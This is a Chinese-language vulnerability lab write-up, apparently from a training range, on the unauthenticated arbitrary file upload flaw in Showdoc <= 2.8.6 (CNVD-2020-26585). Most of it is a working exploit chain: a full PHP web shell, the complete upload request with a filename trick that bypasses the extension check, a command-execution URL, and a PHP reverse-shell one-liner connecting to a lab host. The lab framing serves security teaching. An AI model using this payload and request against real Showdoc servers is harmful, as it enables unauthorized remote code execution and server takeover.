# 前台任意文件上传（CNVD-2020-26585）

> [English Documentation](README_EN.md)

| 属性 | 详情 |
|------|------|
| **漏洞编号** | CNVD-2020-26585 |
| **影响版本** | Showdoc <= 2.8.6 |
| **漏洞类型** | 任意文件上传 |
| **危险等级** | 🔴 高危 |
| **默认端口** | 8080 |

## 漏洞概述

`Showdoc` 是一个开源的在线共享文档工具。`Showdoc <= 2.8.6` 存在`uploadImg`文件上传漏洞，该漏洞源于未正确使用`upload`方法至文件后缀限制失效，攻击者可在未授权的情况下上传任意文件，进而获取服务器权限等。

## 漏洞复现

靶机启动后，访问`http://your-ip:8080`即可查看到`ShowDoc`的主页。

![ShowDoc主页](https://static.nextcyber.cn/attachments/images/course/task/05bf4612360f422091c473237913544e.png)

靶机是一个`ShowDoc 2.8.2`服务器。

## 漏洞利用

首先我们使用这个[工具](https://www.revshells.com/)生成一个远程命令执行的`php`文件：

![生成php文件](https://static.nextcyber.cn/attachments/images/course/task/d5e86687012e4396a6fb4eb64bec7874.png)

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>

```

然后抓包，把上面的`php`文件内容添加到数据包中，发送：

```
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0RdOKBR8AmAxfRyl
Content-Length: 213

------WebKitFormBoundary0RdOKBR8AmAxfRyl
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>

------WebKitFormBoundary0RdOKBR8AmAxfRyl--

```

![发送数据包](https://static.nextcyber.cn/attachments/images/course/task/6afd4aa394684066b242477e95f55c42.png)

发送成功，同时可以看到`php`文件路径将返回在数据包中：

```
http://192.168.2.73:8080/Public/Uploads/2025-01-01/6774b03713797.php
```

![文件路径](https://static.nextcyber.cn/attachments/images/course/task/8b70a48f8bd14902a9ef2e8465b51715.png)

我们对`url`进行修改，访问我们上传的远程命令执行的`php`文件：

```
http://192.168.2.73:8080/Public/Uploads/2025-01-01/6774b03713797.php?cmd=id
```

可以看到，`id`命令执行成功。

## 反弹shell

使用[工具](https://www.revshells.com/)生成一个`php`的`反弹shell`命令：

```
php -r '$sock=fsockopen("192.168.2.6",1234);exec("/bin/bash <&3 >&3 2>&3");'
```

![生成反弹shell](https://static.nextcyber.cn/attachments/images/course/task/c4d51603124f4612bb7e221f60394163.png)

在网页上直接执行：

![执行反弹shell](https://static.nextcyber.cn/attachments/images/course/task/5bdda24c22b04bb4af12385e1d2e9881.png)

成功拿到`shell`。

---

## 靶场练习

前往 [NextCyber 靶场](https://app.nextcyber.cn/courses/148) 在线实战演练上述漏洞。

---

> ⚠️ **免责声明**：本目录所有内容仅供学习研究使用，请勿用于非法用途。
